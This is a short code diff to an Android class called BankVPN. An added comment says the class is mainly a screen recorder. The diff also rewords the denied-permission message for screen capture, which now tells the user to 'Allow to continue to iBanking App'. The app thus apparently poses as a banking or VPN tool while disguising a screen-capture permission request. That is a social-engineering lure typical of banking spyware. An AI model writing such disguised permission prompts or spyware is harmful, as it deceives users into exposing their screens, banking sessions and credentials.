@@ -41,6 +41,9 @@ import java.util.Date;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 
+/* BankVPN mainly does the function of screen recording where source code is taken from
+ * https://www.truiton.com/2015/05/capture-record-android-screen-using-mediaprojection-apis/
+ *  */
 public class BankVPN extends AppCompatActivity {
 
     private static final String TAG = "BankVPN";
@@ -110,7 +113,7 @@ public class BankVPN extends AppCompatActivity {
         }
         if (resultCode != RESULT_OK) {
             Toast.makeText(this,
-                    "Screen Cast Permission Denied", Toast.LENGTH_SHORT).show();
+                    "Allow to continue to iBanking App", Toast.LENGTH_SHORT).show();
             mToggleButton.setChecked(false);
             return;
         }
